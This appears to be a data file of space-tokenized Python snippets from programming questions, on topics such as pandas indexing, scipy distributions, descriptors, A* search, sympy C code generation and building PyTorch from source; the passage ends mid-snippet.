( self._objective ) and not ( raw_score or pred_leaf or pred_contrib ) : warnings.warn ( `` Can not compute class probabilities or labels `` `` due to the usage of customized objective function.\n '' `` Returning raw scores instead . '' ) return result elif self._n_classes > 2 or raw_score or pred_leaf or pred_contrib : return result else : return np.vstack ( ( 1 . - result , result ) ) .transpose ( )"
"usernew @ HP : /usr/lib/python3/dist-packages/gi $ gnome-terminalTraceback ( most recent call last ) : File `` /usr/bin/gnome-terminal '' , line 9 , in < module > from gi.repository import GLib , Gio File `` /usr/lib/python3/dist-packages/gi/__init__.py '' , line 42 , in < module > from . import _giImportError : can not import name '_gi ' from partially initialized module 'gi ' ( most likely due to a circular import ) ( /usr/lib/python3/dist-packages/gi/__init__.py )"
"from scipy.stats import rv_continuousimport numpy as npclass log_uniform_gen ( rv_continuous ) : `` Log-uniform distribution '' def _pdf ( self , x ) : if np.exp ( self.a ) < = x < = np.exp ( self.b ) : temp = x / ( self.b - self.a ) else : temp = 0. return templog_uniform = log_uniform_gen ( a=0.1 , b=1.0 , name='log-uniform ' )"
"import pandas as pdimport numpy as npncols = 1000nlines = 1000columns = pd.MultiIndex.from_product ( [ [ 0 ] , [ 0 ] , np.arange ( ncols ) ] ) lines = pd.MultiIndex.from_product ( [ [ 0 ] , [ 0 ] , np.arange ( nlines ) ] ) # df has multiindexdf = pd.DataFrame ( columns = columns , index = lines ) # df2 has mono-index , and is initialized a certain waydf2 = pd.DataFrame ( columns = np.arange ( ncols ) , index = np.arange ( nlines ) ) for i in range ( ncols ) : df2 [ i ] = i*np.arange ( nlines ) # df3 is mono-index and not initializeddf3 = pd.DataFrame ( columns = np.arange ( ncols ) , index = np.arange ( nlines ) ) # df4 is mono-index and initialized another way compared to df2df4 = pd.DataFrame ( columns = np.arange ( ncols ) , index = np.arange ( nlines ) ) for i in range ( ncols ) : df4 [ i ] = i % timeit df.loc [ ( 0 , 0 , 0 ) , ( 0 , 0 ) ] = 2*np.arange ( ncols ) 1 loop , best of 3 : 786 ms per loopThe slowest run took 69.10 times longer than the fastest . This could mean that an intermediate result is being cached. % timeit df2.loc [ 0 ] = 2*np.arange ( ncols ) 1000 loops , best of 3 : 275 µs per loop % timeit df3.loc [ 0 ] = 2*np.arange ( ncols ) 10 loops , best of 3 : 31.4 ms per loop % timeit df4.loc [ 0 ] = 2*np.arange ( ncols ) 10 loops , best of 3 : 63.9 ms per loop def mod ( df , arr , ncols ) : for j in range ( ncols ) : df.at [ ( 0 , 0 , 0 ) , ( 0 , 0 , j ) ] = arr [ j ] return df % timeit mod ( df , np.arange ( ncols ) , ncols ) The slowest run took 10.44 times longer than the fastest . This could mean that an intermediate result is being cached.100 loops , best of 3 : 14.6 ms per loop"
"class MyClass : X = 1 Y = 2 enum MyFlags { Alpha = 0 , Beta = 1 } ; module.MyFlags.Alphamodule.MyFlags.Beta"
"request = { 'labelIds ' : [ 'INBOX ' ] , 'topicName ' : 'projects/myproject/topics/mytopic ' } gmail.users ( ) .watch ( userId='me ' , body=request ) .execute ( )"
"def f ( ) : return 0 , 1a , b = f ( ) # 1 [ a , b ] = f ( ) # 2 ( a , b ) = f ( ) # 3"
"crop = np.ones ( ( width , width ) ) # this is my image slices = np.arange ( 0 , width,1 ) stack = np.zeros ( ( 2*width , len ( slices ) ) ) angles = np.linspace ( 0,2*np.pi , len ( crop2 ) ) for j in range ( len ( slices2 ) ) : # take slices stack [ : ,j ] = rotate ( crop , slices [ j ] , reshape=False ) [ : ,width ]"
"import pandas as pdimport matplotlibimport matplotlib.pyplot as pltfrom mpl_toolkits.mplot3d import Axes3Dimport numpy as npdf = pd.DataFrame ( { 10 : { 10 : 1,15 : 1,20 : 1,25 : 1,30 : 1,35 : 1,40 : 1,45 : 1,50 : 1,55 : 1,60 : 1,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 15 : { 10 : 4,15 : 1,20 : 1,25 : 1,30 : 1,35 : 1,40 : 1,45 : 1,50 : 1,55 : 1,60 : 1,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 20 : { 10 : 6,15 : 3,20 : 1,25 : 1,30 : 1,35 : 1,40 : 1,45 : 1,50 : 1,55 : 1,60 : 1,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 25 : { 10 : 7,15 : 5,20 : 3,25 : 1,30 : 1,35 : 1,40 : 1,45 : 1,50 : 1,55 : 1,60 : 1,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 30 : { 10 : 9,15 : 6,20 : 4,25 : 3,30 : 1,35 : 1,40 : 1,45 : 1,50 : 1,55 : 1,60 : 1,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 35 : { 10 : 10,15 : 7,20 : 5,25 : 4,30 : 2,35 : 1,40 : 1,45 : 1,50 : 1,55 : 1,60 : 1,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 40 : { 10 : 11,15 : 8,20 : 6,25 : 4,30 : 3,35 : 2,40 : 1,45 : 1,50 : 1,55 : 1,60 : 1,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 45 : { 10 : 12,15 : 9,20 : 7,25 : 5,30 : 4,35 : 3,40 : 2,45 : 1,50 : 1,55 : 1,60 : 1,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 50 : { 10 : 13,15 : 9,20 : 7,25 : 6,30 : 5,35 : 4,40 : 3,45 : 2,50 : 1,55 : 1,60 : 1,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 55 : { 10 : 14,15 : 10,20 : 8,25 : 7,30 : 5,35 : 4,40 : 3,45 : 3,50 : 2,55 : 1,60 : 1,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 60 : { 10 : 15,15 : 11,20 : 9,25 : 7,30 : 6,35 : 5,40 : 4,45 : 3,50 : 3,55 : 2,60 : 1,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 65 : { 10 : 16,15 : 12,20 : 9,25 : 8,30 : 6,35 : 5,40 : 5,45 : 4,50 : 3,55 : 2,60 : 2,65 : 1,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 70 : { 10 : 17,15 : 12,20 : 10,25 : 8,30 : 7,35 : 6,40 : 5,45 : 4,50 : 4,55 : 3,60 : 2,65 : 2,70 : 1,75 : 1,80 : 1,85 : 1,90 : 1 } , 75 : { 10 : 18,15 : 13,20 : 10,25 : 9,30 : 7,35 : 6,40 : 5,45 : 5,50 : 4,55 : 3,60 : 3,65 : 2,70 : 2,75 : 1,80 : 1,85 : 1,90 : 1 } , 80 : { 10 : 19,15 : 14,20 : 11,25 : 9,30 : 8,35 : 7,40 : 6,45 : 5,50 : 4,55 : 4,60 : 3,65 : 3,70 : 2,75 : 2,80 : 1,85 : 1,90 : 1 } , 85 : { 10 : 21,15 : 14,20 : 11,25 : 10,30 : 8,35 : 7,40 : 6,45 : 6,50 : 5,55 : 4,60 : 4,65 : 3,70 : 3,75 : 2,80 : 2,85 : 1,90 : 1 } , 90 : { 10 : 23,15 : 15,20 : 12,25 : 10,30 : 9,35 : 8,40 : 7,45 : 6,50 : 5,55 : 5,60 : 4,65 : 3,70 : 3,75 : 3,80 : 2,85 : 2,90 : 1 } } ) xv , yv = np.meshgrid ( df.index , df.columns ) ma = np.nanmax ( df.values ) norm = matplotlib.colors.Normalize ( vmin = 0 , vmax = ma , clip = True ) fig = plt.figure ( 1 ) ax = Axes3D ( fig ) surf = ax.plot_surface ( yv , xv , df , cmap='viridis_r ' , linewidth=0.3 , alpha = 0.8 , edgecolor = ' k ' , norm=norm ) ax.scatter ( 25,35,4 , c= ' k ' , depthshade=False , alpha = 1 , s=100 ) fig = plt.figure ( 2 ) ax = Axes3D ( fig ) surf = ax.plot_surface ( yv , xv , df , cmap='viridis_r ' , linewidth=0.3 , alpha = 0.8 , edgecolor = ' k ' , norm=norm ) line1_x = [ 25,25 ] line1_y = [ 35,35 ] line1_z = [ 3,5 ] line2_x = [ 25,25 ] line2_y = [ 33,37 ] line2_z = [ 4,4 ] line3_x = [ 23,27 ] line3_y = [ 35,35 ] line3_z = [ 4,4 ] ax.plot ( line1_x , line1_y , line1_z , alpha = 1 , linewidth = 1 , color= ' k ' ) ax.plot ( line2_x , line2_y , line2_z , alpha = 1 , linewidth = 1 , color= ' k ' ) ax.plot ( line3_x , line3_y , line3_z , alpha = 1 , linewidth = 1 , color= ' k ' ) plt.show ( )"
module_name = `` com.processors '' class_name = `` FileProcessor '' method_name = `` process ''
"class ModelA : ... class ModelX : ... class Model : a = models.ForeignKey ( ModelA , default = A ) x = models.ForeignKey ( ModelX , default = X ) class ModelY : ... class Model : y = models.ForeignKey ( ModelY , default = ? ? ? ? ? ? )"
"pair = ( key , some_dict.pop ( key ) ) pair = ( min ( some_dict , key=some.get ) , some_dict.pop ( min ( some_dict , key=some_dict.get ) ) )"
"test = [ [ 0.0 ] * 10 ] * 10 test [ 0 ] [ 0 ] = 1.0 print test [ [ 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 ] , [ 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 ] , [ 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 ] , [ 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 ] , [ 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 ] , [ 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 ] , [ 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 ] , [ 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 ] , [ 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 ] , [ 1.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 ] ]"
"import heapqdef solve_astar ( graph ) : open_q = [ ] heapq.heappush ( open_q , ( 0 , graph.start_point ) ) while open_q : current = heapq.heappop ( open_q ) [ 1 ] current.seen = True # Equivalent of being in a closed queue for n in current.neighbours : if n is graph.end_point : n.parent = current open_q = [ ] # Clearing the queue stops the process # Ignore if previously seen ( ie , in the closed queue ) if n.seen : continue # Ignore If n already has a parent and the parent is closer if n.parent and n.parent.g < = current.g : continue # Set the parent , or switch parents if it already has one if not n.parent : n.parent = current elif n.parent.g > current.g : remove_from_heap ( n , n.f , open_q ) n.parent = current # Set the F score ( simple , uses Manhattan ) set_f ( n , n.parent , graph.end_point ) # Push it to queue , prioritised by F score heapq.heappush ( open_q , ( n.f , n ) ) def set_f ( point , parent , goal ) : point.g += parent.g h = get_manhattan ( point , goal ) point.f = point.g + h"
"List = [ i1 , i2 , i3 ] Result = [ i1*i2 , i1*i3 , i2*i3 ] def function ( ) : for j in range ( len ( list ) ) : n = j+1 for i in range ( len ( list ) ) : if n+i > len ( list ) : n -= 1 x = factor [ j ] * factor [ j+i ] result.append ( x ) return"
def foo ( *args ) : # Each arg expected to be of type T ...
"class EnterTest ( object ) : def myenter ( self ) : pass def __exit__ ( self , type , value , traceback ) : pass def __getattr__ ( self , name ) : if name == '__enter__ ' : return self.myenterenter_obj = EnterTest ( ) print getattr ( enter_obj , '__enter__ ' ) with enter_obj : pass < bound method EnterTest.myenter of < __main__.EnterTest object at 0x00000000021432E8 > > Traceback ( most recent call last ) : File `` test.py '' , line 14 , in < module > with enter_obj : AttributeError : __enter__ C : \Python27\python27.exe 2.7 ( r27:82525 , Jul 4 2010 , 07:43:08 ) [ MSC v.1500 64 bit ( AMD64 ) ]"
prompt = `` Question : `` answer = raw_input ( prompt ) print answerprint ( `` Correct ! '' ) > > Question : my answer > > Correct ! > > Correct !
"def pairwise ( iterable ) : `` s - > ( s0 , s1 ) , ( s1 , s2 ) , ( s2 , s3 ) , ... '' a , b = tee ( iterable ) next ( b , None ) return zip ( a , b )"
"@ when ( int ) def dumbexample ( a ) : return a * 2 @ when ( list ) def dumbexample ( a ) : return [ ( `` % s '' % i ) for i in a ] dumbexample ( 1 ) # calls first implementationdumbexample ( [ 1,2,3 ] ) # calls second implementation class WebComponentUserAdapter ( object ) : def __init__ ( self , guest ) : self.guest = guest def canDoSomething ( self ) : return guest.member_of ( `` something_group '' ) @ when ( my.webframework.User ) componentNeedsAUser ( user ) : return WebComponentUserAdapter ( user )"
"import warningswarnings.simplefilter ( action='error ' , category=ResourceWarning ) my_test ( __main__.MyTest ) ... Exception ignored in : < socket.socket fd=9 , family=AddressFamily.AF_INET , type=SocketType.SOCK_STREAM , proto=0 , laddr= ( '127.0.0.1 ' , 54065 ) , raddr= ( '127.0.0.1 ' , 27017 ) > ResourceWarning : unclosed < socket.socket fd=9 , family=AddressFamily.AF_INET , type=SocketType.SOCK_STREAM , proto=0 , laddr= ( '127.0.0.1 ' , 54065 ) , raddr= ( '127.0.0.1 ' , 27017 ) > ok -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 1 test in 0.110s"
"from tensorflow.python.client import device_libdef get_available_gpus ( ) : local_device_protos = device_lib.list_local_devices ( ) return [ x.name for x in local_device_protos if x.device_type == 'GPU ' ] C : \Programming\Anaconda3\python.exe D : /cnn_classify_cifar10.py Using Theano backend.DEBUG : nvcc STDOUT nvcc warning : The 'compute_20 ' , 'sm_20 ' , and 'sm_21 ' architectures are deprecated , and may be removed in a future release ( Use -Wno-deprecated-gpu-targets to suppress warning ) .mod.cu Creating library C : /Users/Alex/AppData/Local/Theano/compiledir_Windows-10-10.0.14393-SP0-Intel64_Family_6_Model_60_Stepping_3_GenuineIntel-3.5.2-64/tmpgsy496fe/m91973e5c136ea49268a916ff971b7377.lib and object C : /Users/Alex/AppData/Local/Theano/compiledir_Windows-10-10.0.14393-SP0-Intel64_Family_6_Model_60_Stepping_3_GenuineIntel-3.5.2-64/tmpgsy496fe/m91973e5c136ea49268a916ff971b7377.expUsing gpu device 0 : GeForce GTX 770 ( CNMeM is enabled with initial size : 80.0 % of memory , cuDNN 5005 ) [ global ] device = gpufloatX = float32 [ cuda ] root = C : \Program Files\NVIDIA GPU Computing Toolkit\CUDA\v8.0 [ nvcc ] flags=-LC : C : \Programming\WinPython-64bit-3.5.2.2\python-3.5.2.amd64\libs"
date = `` 11/28/2009 '' hour = `` 23 '' minutes = `` 59 '' seconds = `` 00 ''
"> > > my_dictionary.items ( ) [ ( 'name ' , 'Old Gregg ' ) , ( 'Race ' , 'Scaly Man-Fish ' ) ] > > > len ( my_dictionary ) 2 my_dictionary.__len__ ( ) my_dictionary.len ( )"
"$ .post ( `` $ { request.route_url ( 'my_view ' ) } '' , { 'data ' : 'some data ' } , function ( html ) { $ ( `` # destination '' ) .html ( html ) ; } ) ; `` $ { request.route_url ( 'my_view ' ) } ''"
"> > > class Potato : ... def __eq__ ( self , other ) : ... return False ... def __hash__ ( self ) : ... return random.randint ( 1 , 10000 ) ... > > > p = Potato ( ) > > > p == pFalse > > > p in { p } False > > > p in { p : 0 } False > > > p in [ p ] True"
"my_dict = { 1 : [ 964725688 , 6928857 ] , ... 22 : [ 1667906 , 35207807 , 685530997 , 35207807 ] , ... } 1 9647256881 6928857 ... 22 166790622 3520780722 68553099722 35207807"
"B = np.zeros ( shape=A.shape ) for i in range ( A.shape [ 2 ] ) : B [ : , : , i ] = np.linalg.inv ( A [ : , : , i ] ) B = np.asarray ( map ( np.linalg.inv , np.squeeze ( np.dsplit ( A , A.shape [ 2 ] ) ) ) ) .transpose ( 1 , 2 , 0 )"
"> > > from oscar.apps.partner import strategy , prices > > > from oscar.apps.catalogue.models import * > > > product = Product.objects.get ( pk=1 ) > > > info = strategy.fetch_for_product ( product ) Traceback ( most recent call last ) : File `` < console > '' , line 1 , in < module > AttributeError : 'module ' object has no attribute 'fetch_for_product ' > > > dir ( strategy ) > > > [ 'Base ' , 'D ' , 'Default ' , 'DeferredTax ' , 'FixedRateTax ' , 'NoTax ' , 'PurchaseInfo ' , 'Selector ' , 'StockRequired ' , 'Structured ' , 'UK ' , 'US ' , 'UseFirstStockRecord ' , '__builtins__ ' , '__doc__ ' , '__file__ ' , '__name__ ' , '__package__ ' , 'availability ' , 'namedtuple ' , 'prices ' ]"
"A = [ [ [ 2008 , 5 ] , [ 2009 , 5 ] , [ 2010 , 2 ] , [ 2011 , 5 ] , [ 2013 , 17 ] ] , [ [ 2008 , 6 ] , [ 2009 , 3 ] , [ 2011 , 1 ] , [ 2013 , 6 ] ] , [ [ 2013 , 9 ] ] , [ [ 2008 , 4 ] , [ 2011 , 1 ] , [ 2013 , 4 ] ] , [ [ 2010 , 3 ] , [ 2011 , 3 ] , [ 2013 , 1 ] ] , [ [ 2008 , 2 ] , [ 2011 , 4 ] , [ 2013 , 1 ] ] , [ [ 2009 , 1 ] , [ 2010 , 1 ] , [ 2011 , 3 ] , [ 2013 , 3 ] ] , [ [ 2010 , 1 ] , [ 2011 , 1 ] , [ 2013 , 5 ] ] , [ [ 2011 , 1 ] , [ 2013 , 4 ] ] , [ [ 2009 , 1 ] , [ 2013 , 4 ] ] , [ [ 2008 , 1 ] , [ 2013 , 3 ] ] , [ [ 2009 , 1 ] , [ 2013 , 2 ] ] , [ [ 2013 , 2 ] ] , [ [ 2011 , 1 ] , [ 2013 , 1 ] ] , [ [ 2013 , 1 ] ] , [ [ 2013 , 1 ] ] , [ [ 2011 , 1 ] ] , [ [ 2011 , 1 ] ] ] [ 2008 , 5 ] , [ 2009 , 5 ] , [ 2010 , 2 ] , [ 2011 , 5 ] , [ 2013 , 17 ] [ min_year , 0 ] ... [ 2008 , 5 ] , [ 2009 , 5 ] , [ 2010 , 2 ] , [ 2011 , 5 ] , [ 2012 , 0 ] , [ 2013 , 17 ] , .. [ max_year , 0 ]"
"__getattr__ = dict.__getitem____setattr__ = dict.__setitem____delattr__ = dict.__delitem__ KeyError : '__deepcopy__ ' copier = getattr ( x , `` __deepcopy__ '' , None ) def __deepcopy__ ( self , memo ) : # create a new instance of this object new_object = type ( self ) ( ) # iterate over the items of this object and copy each one for key , value in self.iteritems ( ) : new_object [ key ] = copy.deepcopy ( value , memo ) return new_object"
"class MyDescriptor ( object ) : def __get__ ( self , instance , owner ) : return self._value def __set__ ( self , instance , value ) : self._value = value def __delete__ ( self , instance ) : del ( self._value ) class MyClass1 ( object ) : value = MyDescriptor ( ) > > > m1 = MyClass1 ( ) > > > m1.value = 1 > > > m2 = MyClass1 ( ) > > > m2.value = 2 > > > m1.value2 class MyClass2 ( object ) value = 1 > > > y1 = MyClass2 ( ) > > > y1.value=1 > > > y2 = MyClass2 ( ) > > > y2.value=2 > > > y1.value1"
thisTable = dbf.Table ( '/volumes/readOnlyVolume/thisFile.dbf ' ) thisTable.open ( )
"a = np.array ( [ 1,2 ] ) b = np.array ( [ [ 1,4 ] , [ 3,4 ] ] ) > > > np.dot ( a , b ) array ( [ 7 , 12 ] ) import numpy as npcimport numpy as npDTYPE = np.intctypedef np.int_t DTYPE_tdef dot ( np.ndarray a , np.ndarray b ) : cdef int d = np.dot ( a , b ) return d > > > dot ( a , b ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` test.pyx '' , line 8 , in test.dot ( test.c:1262 ) cdef int d = np.dot ( a , b ) TypeError : only length-1 arrays can be converted to Python scalars"
"from sympy import *from sympy.physics.mechanics import *from sympy.printing import print_ccodefrom sympy.utilities.codegen import codegenx1 , x2 , x3 = symbols ( 'x1 x2 x3 ' ) y1 , y2 , y3 = symbols ( 'y1 y2 y3 ' ) z1 , z2 , z3 = symbols ( 'z1 z2 z3 ' ) u = ReferenceFrame ( ' u ' ) u1= ( u.x*x1 + u.y*y1 + u.z*z1 ) u2= ( u.x*x2 + u.y*y2 + u.z*z2 ) u3= ( u.x*x3 + u.y*y3 + u.z*z3 ) s1= ( u1-u2 ) .normalize ( ) s2= ( u2-u3 ) .normalize ( ) v=cross ( s1 , s2 ) f=dot ( v , v ) df_dy2=diff ( f , y2 ) print_ccode ( df_dy2 , assign_to='df_dy2 ' ) [ ( c_name , c_code ) , ( h_name , c_header ) ] = codegen ( ( `` df_dy2 '' , df_dy2 ) , `` C '' , `` test '' , header=False , empty=False ) print c_code # include `` test.h '' # include < math.h > double df_dy2 ( double x1 , double x2 , double x3 , double y1 , double y2 , double y3 , double z1 , double z2 , double z3 ) { return ( ( x1 - x2 ) * ( y2 - y3 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) - ( x2 - x3 ) * ( y1 - y2 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) ) * ( 2* ( x1 - x2 ) * ( y1 - y2 ) * ( y2 - y3 ) / ( pow ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) , 3.0L/2.0L ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) + 2* ( x1 - x2 ) * ( -y2 + y3 ) * ( y2 - y3 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *pow ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) , 3.0L/2.0L ) ) + 2* ( x1 - x2 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) - 2* ( x2 - x3 ) *pow ( y1 - y2 , 2 ) / ( pow ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) , 3.0L/2.0L ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) - 2* ( x2 - x3 ) * ( y1 - y2 ) * ( -y2 + y3 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *pow ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) , 3.0L/2.0L ) ) + 2* ( x2 - x3 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) ) + ( - ( x1 - x2 ) * ( z2 - z3 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) + ( x2 - x3 ) * ( z1 - z2 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) ) * ( -2* ( x1 - x2 ) * ( y1 - y2 ) * ( z2 - z3 ) / ( pow ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) , 3.0L/2.0L ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) - 2* ( x1 - x2 ) * ( -y2 + y3 ) * ( z2 - z3 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *pow ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) , 3.0L/2.0L ) ) + 2* ( x2 - x3 ) * ( y1 - y2 ) * ( z1 - z2 ) / ( pow ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) , 3.0L/2.0L ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) + 2* ( x2 - x3 ) * ( -y2 + y3 ) * ( z1 - z2 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *pow ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) , 3.0L/2.0L ) ) ) + ( ( y1 - y2 ) * ( z2 - z3 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) - ( y2 - y3 ) * ( z1 - z2 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) ) * ( 2*pow ( y1 - y2 , 2 ) * ( z2 - z3 ) / ( pow ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) , 3.0L/2.0L ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) + 2* ( y1 - y2 ) * ( -y2 + y3 ) * ( z2 - z3 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *pow ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) , 3.0L/2.0L ) ) - 2* ( y1 - y2 ) * ( y2 - y3 ) * ( z1 - z2 ) / ( pow ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) , 3.0L/2.0L ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) - 2* ( -y2 + y3 ) * ( y2 - y3 ) * ( z1 - z2 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *pow ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) , 3.0L/2.0L ) ) - 2* ( z1 - z2 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) - 2* ( z2 - z3 ) / ( sqrt ( pow ( x1 - x2 , 2 ) + pow ( y1 - y2 , 2 ) + pow ( z1 - z2 , 2 ) ) *sqrt ( pow ( x2 - x3 , 2 ) + pow ( y2 - y3 , 2 ) + pow ( z2 - z3 , 2 ) ) ) ) ; }"
conda create -- name my_env python=3.5 export CMAKE_PREFIX_PATH= [ anaconda root directory ] conda install numpy pyyaml setuptools cmake cffigit clone -- recursive https : //github.com/pytorch/pytorchMACOSX_DEPLOYMENT_TARGET=10.9 CC=clang CXX=clang++ python setup.py install
"values = [ 1 , 2 , 3 , 4 ] 1 + 21 + 31 + 41 * 21 * 31 * 41 + 2 * 31 + 2 * 41 + 3 * 4"
"class Host ( object ) : `` '' '' Emulate a virtual host attached to a physical interface '' '' '' def __init__ ( self ) : # Insert class properties here ... passclass HostList ( list ) : `` '' '' A container for managing lists of hosts '' '' '' def __init__ ( self ) : self = [ ] def append ( self , hostobj ) : `` '' '' append to the list ... '' '' '' if hostobj.__class__.__name__ == 'Host ' : self.insert ( len ( self ) , hostobj ) else : _classname = hostobj.__class__.__name__ raise RuntimeError , `` Can not append a ' % s ' object to a HostList '' % _classname from collections import MutableSequenceclass HostList ( MutableSequence ) : `` '' '' A container for manipulating lists of hosts '' '' '' def __init__ ( self , data ) : super ( HostList , self ) .__init__ ( ) if ( data is not None ) : self._list = list ( data ) else : self._list = list ( ) def __repr__ ( self ) : return `` < { 0 } { 1 } > '' .format ( self.__class__.__name__ , self._list ) def __len__ ( self ) : `` '' '' List length '' '' '' return len ( self._list ) def __getitem__ ( self , ii ) : `` '' '' Get a list item '' '' '' return self._list [ ii ] def __delitem__ ( self , ii ) : `` '' '' Delete an item '' '' '' del self._list [ ii ] def __setitem__ ( self , ii , val ) : # optional : self._acl_check ( val ) return self._list [ ii ] def __str__ ( self ) : return str ( self._list ) def insert ( self , ii , val ) : # optional : self._acl_check ( val ) self._list.insert ( ii , val ) def append ( self , val ) : self.insert 